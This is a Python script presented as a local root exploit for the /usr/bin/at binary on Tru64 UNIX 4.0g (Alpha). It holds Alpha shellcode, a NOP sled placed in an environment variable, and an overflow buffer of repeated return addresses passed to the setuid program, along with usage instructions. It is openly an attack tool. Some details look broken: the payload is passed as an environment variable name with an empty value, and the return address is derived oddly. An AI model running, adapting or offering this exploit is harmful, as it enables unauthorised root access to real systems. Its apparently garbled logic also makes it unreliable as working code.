#!/usr/bin/env python

import os
import sys
import struct

OFFSET = 0
ALLIGN = 0
NOP = b"\x1f\x04\xff\x47"
DBUF = 8000

shellcode = (
    b"\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42\xfc\xff\x32"
    b"\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2\xff\x47\x3f\x26\x1f\x04"
    b"\x31\x22\xfc\xff\x30\xb2\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11"
    b"\x14\xe3\x43\x20\x35\x20\x42\xff\xff\xff\xff"
    b"\x30\x15\xd9\x43\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e"
    b"\xb6\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22\x13\x05"
    b"\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26\x2f\x62\x73\x22\x38"
    b"\xff\x7e\xb2\x13\x94\xe7\x43\x20\x35\x60\x42\xff\xff\xff\xff"
)

def usage():
    print("\nTru64 UNIX 4.0g (JAVA) (/usr/bin/at)")
    print(" local root exploit. [ALPHA] \n")
    print("Author: Cody Tubbs (loophole of hhp)\n")
    print("Usage: {} <offset> [allign(0..3)]".format(sys.argv[0]))
    print("Examp: {} 0".format(sys.argv[0]))
    print("Examp: {} 0 1".format(sys.argv[0]))
    sys.exit(1)

def main():
    if len(sys.argv) < 2:
        usage()

    offset = int(sys.argv[1])
    allign = int(sys.argv[2]) if len(sys.argv) > 2 else ALLIGN

    address = (offset * -1) & 0xffffffff

    eipeip = bytearray(b'\x69' * DBUF)
    for i in range(allign, DBUF, 4):
        eipeip[i:i+4] = struct.pack("<I", address)

    buffer = b''.join(NOP for _ in range(4096 // len(NOP)))
    buffer += shellcode
    buffer += b'ATEX='
    os.putenv(buffer, '')

    print("Return address %#x, offset: %d." % (address, offset))
    os.execlp("/usr/bin/at", "at", eipeip)

if __name__ == "__main__":
    main()
